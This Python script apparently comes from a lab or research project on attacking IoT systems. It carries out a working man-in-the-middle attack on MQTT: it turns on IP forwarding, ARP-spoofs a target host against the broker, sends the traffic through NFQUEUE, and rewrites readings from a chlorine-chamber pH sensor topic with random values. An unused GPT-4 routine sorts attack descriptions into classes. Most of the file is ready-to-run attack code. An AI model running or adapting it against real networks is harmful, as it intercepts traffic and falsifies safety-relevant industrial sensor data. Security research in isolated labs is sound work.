import os
import random
from urllib import response
import openai, threading
import json
import paho.mqtt.client as mqtt
from langchain.prompts import ChatPromptTemplate
from langchain_openai import ChatOpenAI
from scapy.all import *
import struct
import subprocess
import signal
import time
from netfilterqueue import NetfilterQueue
API_KEY = "Insert here"
openai.api_key = API_KEY
llm_model = "gpt-4"
targetIP = "192.168.8.160"
brokerIP = "192.168.8.210"
message = ""
sniffed_topic = ""
sniffed_message = ""
desired_payload = None
stop_flag = False
def lang_classification ():
    llm_model = "gpt-4"
    {
    "attack_class_fdt": False,
    "attack_class_dos": False,
    "attack_class_phsh": False,
    }

    high_level_attack_description = message
    
    attack_template = """\
    For the following text, extract the following information:

    attack_class_fdt: Does the description suggest innacurate meter readings caused by potential data manipulation? Or does the description suggest input not performing intended actions but is still connected to the MQTT server? \
    Answer True if yes, False if not or unknown.

    attack_class_dos: Does the description indicate flooding or overloading of resources on the network ? \
    Answer True if yes, False if not or unknown.

    attack_class_phsh: Does the description indicate that an employee was tricked or misled into giving up valuable information?
    Answer True if yes, False if not or unknown.

    Format the output as JSON with the following keys:
    attack_class_fdt
    attack_class_dos
    attack_class_phsh

    text:{text}
    
    """
    
    
    prompt_template = ChatPromptTemplate.from_template(attack_template)
    messages = prompt_template.format_messages(text=high_level_attack_description)
    chat = ChatOpenAI(temperature=0.0, model=llm_model, openai_api_key= API_KEY)
    response = chat(messages)
    print(response.content)
    json_data = json.loads(response.content)
    return json_data
 
rec = False

def on_connect(client, userdata, flags, rc):
    print("connected")    
def on_message(client, userdata, msg):
    
    global rec
    global message
    
    print("Received Message: ", str(msg.payload.decode("utf-8")))
    rec = True
    message = str(msg.payload.decode("utf-8"))
    #message += '"""'
    #print (message)
    #print (rec)
    #print (message)
def mqtt_payload_parser(payload):
    try:
        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
        # and variable header starting with the topic length (2 bytes)
        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
        topic = payload[4:4+topic_len].decode()  # Extract topic
        message = payload[4+topic_len:].decode()  # Extract message
        return topic, message
    except Exception as e:
        return None, None

'''
mqtt_message_modifier() - Modifies the current payload of the MQTT message filled with garbage.
TODO: Have AI construct a more meaningful message of equal length. For example, if we are manipulating meter
readings, have it generate a random reasonable number of equal amount of digits. 
IMPORTANT: They must be of equal length due to TCP protocol.
'''
def mqtt_message_modifier(payload):
    try:
        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
        # and variable header starting with the topic length (2 bytes)
        #print("Modifying payload")
        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
        topic = payload[4:4+topic_len].decode()  # Extracts topic
        message = payload[4+topic_len:].decode() #Extracts message
        new_message = ""
        print("\nMessage: " + message + "\n")
        random_value = round(random.uniform(1.2, 6.77), 2)
        if message[0] == "-":
            new_message = "+" + str(random_value)
        else:
            new_message = str(random_value)  #Modified message
        print("\nNew Message: " + new_message + "\n")
        new_payload = payload[:4+topic_len] + new_message.encode() #Reconstructs the payload
        return new_payload
    except Exception as e:
        return None

'''
intercept_modify_forward() - Takes intercepted packet and determines if its a MQTT packet.
Then modifies the payload and send it.

'''
def intercept_modify_forward(pkt):
    global sniffed_topic, sniffed_message
    global targetIP, desired_payload
    packet = IP(pkt.get_payload())
    if packet.haslayer(TCP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        tcp_sport = packet[TCP].sport
        tcp_dport = packet[TCP].dport 
        ack_num = packet[TCP].seq + len(packet[TCP].payload)
        seq_num = packet[TCP].seq

        # Check if this is MQTT traffic between the two VMs
        if (tcp_dport == 1883 and ip_src == targetIP):
            #print(f"Packet received: {pkt}")
            topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
            if topic == "chlo_chamber/ph_sensor" and message:
                print("\nTopic: " + topic + "\n")
                
                #Constructs and assigns new payload.
                new_payload = mqtt_message_modifier(bytes(packet[TCP].payload))
                packet[Raw].load = new_payload
                #Recalculates the checksum
                del packet[IP].chksum
                del packet[TCP].chksum
                #print(packet[IP].len)
                original_stdout = sys.stdout
                sys.stdout = open(os.devnull, 'w')
                #Reconstructs checksum values
                packet.show2()
                pkt.set_payload(bytes(packet))
                #Sends packet
                pkt.accept()
                sys.stdout = original_stdout
                
            else:
                pkt.accept()
        else:
            pkt.accept()
    else:
        pkt.accept()
'''
def generate_fake_payload(packet):
    global sniffed_topic, sniffed_message
    global targetIP, desired_payload
   
    if packet.haslayer(TCP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        tcp_sport = packet[TCP].sport
        tcp_dport = packet[TCP].dport 
        # Check if this is MQTT traffic between the two VMs
        if (tcp_dport == 1883 and ip_src == attackerIP):
            topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
            if topic and message:
                packet.show()
                desired_payload = packet[Raw].load

def publish_fake_message():
    global stop_flag
    while not stop_flag:
        new_message = 'z' * len(sniffed_message)
        os.system(f'mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "{new_message}"')
        time.sleep(2)
'''
'''
fake_data_transfer_attack() - Performs fake data transfer
'''
def fake_data_transfer_attack():
    global targetIP, client, desired_payload, stop_flag
    #Performs packet sniffing to discover topic and message:
    #TODO allow for multiple topics to be found. Then have AI determine which topic would be appropriate for attacking.
    print("Performing Fake Data Transfer...")
    print("Sniffing Packets...")
    #sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 5)
    #print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
    
    try:
    
        #Enables ip forwarding (hence passing on the packets we get)
        #TODO: Have AI generate this command
        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
        #Reroutes the packets from the gateway router through this computer.
        #TODO: Have AI generate this command. But you must have this program run in parrallel.
        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("ARP spoofing mqtt")
        time.sleep(3)
        #Enables nfqueue
        command = f"sudo iptables -A FORWARD -s {targetIP} -j NFQUEUE --queue-num 1"
        os.system(command)
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(1, intercept_modify_forward)
        try:
            nfqueue.run()
        except Exception as e:
            print(f"An error occurred: {e}")
        print("Netfilter queue")
        # Set the callback function for intercepted packets
        while True:
            time.sleep(5)
            #client.publish(sniffed_topic, "Hacked")
            pass
    except KeyboardInterrupt:
        print("Stopping fake data")
        os.kill(nodeAttack.pid, signal.SIGTERM)
        #os.kill(routerAttack.pid, signal.SIGTERM)
        command = f"sudo iptables -D FORWARD -s {targetIP} -j NFQUEUE --queue-num 1"
        os.system(command)
        # Clean up when the user interrupts the script
        nfqueue.unbind()


#TODO: Create a command that sends relevant attack information to the XR AI agent (Trenton).

try:
    while True: 
        #lang_classification()
            #response = lang_classification()
            #json_string = '{"attack_class_fdt": true, "attack_class_dos": false, "attack_class_phsh": false}'
            #response = json.loads(json_string)
        fake_data_transfer_attack()
        
        break

except KeyboardInterrupt:
    print("Stopping Attack....")

